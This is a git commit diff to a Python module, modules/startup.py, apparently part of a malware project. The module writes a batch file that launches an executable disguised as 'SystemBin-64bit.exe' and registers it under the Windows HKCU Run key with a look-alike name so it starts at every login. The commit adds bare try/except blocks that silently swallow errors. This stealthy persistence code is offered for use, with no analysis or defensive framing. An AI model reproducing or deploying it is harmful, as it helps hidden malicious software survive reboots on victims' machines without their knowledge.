a087a8305ae9d7dc6f2e2dbebf2570566c4a8151
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-27 23:01:51 +0200

    Update startup.py

--- modules/startup.py
+++ modules/startup.py
@@ -4,15 +4,21 @@ import os
 
 class StartUp:
     def run(self):
-        self.dir = os.getcwd()
-        with open(f"{self.dir}/run.bat", "w") as f:
-            f.write("@echo off")
-            f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
-        self.reg_edit()
+        try:
+            self.dir = os.getcwd()
+            with open(f"{self.dir}/run.bat", "w") as f:
+                f.write("@echo off")
+                f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
+            self.reg_edit()
+        except:
+            return
             
     def reg_edit(self):
-        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/f"], shell=True)
-        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/t", "REG_SZ", "/d", f"{self.dir}\\run.bat", "/f"], shell=True)
+        try:
+            subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/f"], shell=True)
+            subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/t", "REG_SZ", "/d", f"{self.dir}\\run.bat", "/f"], shell=True)
+        except:
+            return
     
         
 #startup = StartUp()
